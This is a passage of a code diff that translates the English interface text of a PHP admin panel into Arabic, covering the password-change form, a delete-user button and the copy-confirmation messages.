+                                            <a href="?delete_user=<?php echo $u['id']; ?>" class="btn btn-danger" style="padding: 6px 12px; font-size: 12px;" onclick="return confirm('حذف الزميل وكل روابطه؟');">حذف</a>
                                         </div>
                                     </td>
                                 </tr>
@@ -802,24 +802,24 @@ if ($is_logged_in) {
 
             <div id="tab-settings" class="tab-content">
                 <div class="card" style="max-width: 600px; margin: 0 auto;">
-                    <div class="card-title">Change Password</div>
+                    <div class="card-title">🔐 تغيير كلمة المرور</div>
                     <?php if (!empty($pass_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px;"><?php echo $pass_error; ?></p><?php endif; ?>
                     <?php if (!empty($pass_success)): ?><p style="color: var(--success); font-size: 13px; margin-bottom: 15px;"><?php echo $pass_success; ?></p><?php endif; ?>
                     
                     <form method="POST">
                         <div class="form-group">
-                            <label>Current Password</label>
+                            <label>كلمة المرور الحالية</label>
                             <input type="password" name="current_password" required>
                         </div>
                         <div class="form-group">
-                            <label>New Password</label>
+                            <label>كلمة المرور الجديدة</label>
                             <input type="password" name="new_password" required>
                         </div>
                         <div class="form-group">
-                            <label>Confirm New Password</label>
+                            <label>تأكيد كلمة المرور الجديدة</label>
                             <input type="password" name="confirm_password" required>
                         </div>
-                        <button type="submit" name="change_my_password" class="btn" style="width: 100%;">Save Changes</button>
+                        <button type="submit" name="change_my_password" class="btn" style="width: 100%;">حفظ التغييرات</button>
                     </form>
                 </div>
             </div>
@@ -829,7 +829,7 @@ if ($is_logged_in) {
 
 <?php endif; ?>
 
-<div class="toast" id="toast">Copied successfully!</div>
+<div class="toast" id="toast">✅ تم النسخ بنجاح!</div>
 
 <footer style="text-align: center; padding: 20px; border-top: 1px solid var(--border); background: var(--sidebar-bg); margin-top: auto; backdrop-filter: blur(10px);">
     <div style="display: flex; align-items: center; justify-content: center; gap: 10px; flex-direction: column;">
@@ -863,7 +863,7 @@ if ($is_logged_in) {
             setTimeout(() => t.classList.remove('show'), 2000);
             if(btn) {
                 const o = btn.innerText; 
-                btn.innerText = "Copied!"; 
+                btn.innerText = "تم النسخ!"; 
                 setTimeout(() => { btn.innerText = o; }, 2000);
             }
         });
